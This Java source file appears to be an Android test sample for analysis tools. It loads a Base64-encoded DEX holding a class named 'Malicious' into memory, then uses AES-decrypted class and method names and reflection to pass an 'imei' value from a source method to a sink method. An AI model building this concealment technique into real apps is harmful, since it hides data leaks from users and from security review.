package com.example.theseus;

import android.app.Activity;
import android.util.Base64;
import android.util.Log;
import dalvik.system.InMemoryDexClassLoader;
import java.lang.Class;
import java.lang.ClassLoader;
import java.nio.ByteBuffer;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.security.Key;

public class Main {

    private static final String DEX = "ZGV4CjAzNQDonIk5owDjcxORqWvCJ0rZuaMyJCy5AF7kAwAAcAAAAHhWNBIAAAAAAAAAAEQDAAAQAAAAcAAAAAYAAACwAAAABAAAAMgAAAAAAAAAAAAAAAYAAAD4AAAAAQAAACgBAACcAgAASAEAAMQBAADMAQAA0AEAANUBAADtAQAADgIAACsCAAA/AgAAUwIAAGMCAABmAgAAawIAAHUCAACAAgAAhgIAAI4CAAADAAAABAAAAAUAAAAGAAAABwAAAAkAAAABAAAABAAAAKwBAAACAAAABAAAALQBAAAJAAAABQAAAAAAAAAKAAAABQAAALwBAAABAAIAAAAAAAEAAQALAAAAAQABAAwAAAACAAMADQAAAAIAAAAOAAAAAwACAAAAAAABAAAAAQAAAAMAAAAAAAAACAAAAAAAAAAsAwAAAAAAAAIAAgABAAAAmAEAAAUAAABxEAQAAAAMABEAAAACAAIAAgAAAJ4BAAAFAAAAcSADAAEAEgARAAAAAQABAAEAAAClAQAABAAAAHAQBQAAAA4ABgIAAA4ACgIAAA48AAQADgAAAAABAAAABAAAAAIAAAAEAAAAAgAAAAAABAAGPGluaXQ+AAJMTAADTExMABZMYW5kcm9pZC9hcHAvQWN0aXZpdHk7AB9MY29tL2V4YW1wbGUvdGhlc2V1cy9NYWxpY2lvdXM7ABtMY29tL2V4YW1wbGUvdGhlc2V1cy9VdGlsczsAEkxqYXZhL2xhbmcvT2JqZWN0OwASTGphdmEvbGFuZy9TdHJpbmc7AA5NYWxpY2lvdXMuamF2YQABVgADVkxMAAhnZXRfZGF0YQAJc2VuZF9kYXRhAARzaW5rAAZzb3VyY2UAmwF+fkQ4eyJiYWNrZW5kIjoiZGV4IiwiY29tcGlsYXRpb24tbW9kZSI6ImRlYnVnIiwiaGFzLWNoZWNrc3VtcyI6ZmFsc2UsIm1pbi1hcGkiOjEsInNoYS0xIjoiZmFjZWRmNDFiYmQyOGI1NjNkMWU5ZTA5YzVmNzJkN2M1Y2E1OThkNSIsInZlcnNpb24iOiI4LjIuMi1kZXYifQAAAAMAAIGABIADAQnIAgEJ5AIAAAAAAAANAAAAAAAAAAEAAAAAAAAAAQAAABAAAABwAAAAAgAAAAYAAACwAAAAAwAAAAQAAADIAAAABQAAAAYAAAD4AAAABgAAAAEAAAAoAQAAASAAAAMAAABIAQAAAyAAAAMAAACYAQAAARAAAAMAAACsAQAAAiAAABAAAADEAQAAACAAAAEAAAAsAwAAAxAAAAEAAABAAwAAABAAAAEAAABEAwAA";
    private Key key;
    ClassLoader cl;
    Activity ac;


    public Main(Activity ac) throws Exception {
        this.key = new SecretKeySpec("_-_Secret Key_-_".getBytes(), "AES");
        this.ac = ac;
        byte[] bytes = Base64.decode(DEX, Base64.NO_WRAP);
        this.cl = new InMemoryDexClassLoader(ByteBuffer.wrap(bytes), Main.class.getClassLoader());
    }

    public void main() throws  Exception {
        String[] methods = {"n6WGYJzjDrUvR9cYljlNlw==", "dapES0wl/iFIPuMnH3fh7g=="};
        Class cls = cl.loadClass(decrypt("W5f3xRf3wCSYcYG7ckYGR5xuuESDZ2NcDUzGxsq3sls="));

        Object val = "imei";

        for (String method : methods) {
            val = cls.getMethod(decrypt(method), String.class, Activity.class).invoke(null, val, ac);
        }
    }

    public String encrypt(String s) throws  Exception {
        Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");// Doubious choise of encryption but it's just a demo
        c.init(Cipher.ENCRYPT_MODE, key);
        byte[] cpt = c.doFinal(s.getBytes());
        return Base64.encodeToString(cpt, Base64.NO_WRAP);
    }

    public String decrypt(String s) throws  Exception {
        Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");// Doubious choise of encryption but it's just a demo
        c.init(Cipher.DECRYPT_MODE, key);
        byte[] clt = c.doFinal(Base64.decode(s, Base64.NO_WRAP));
        return new String(clt);
    }
}
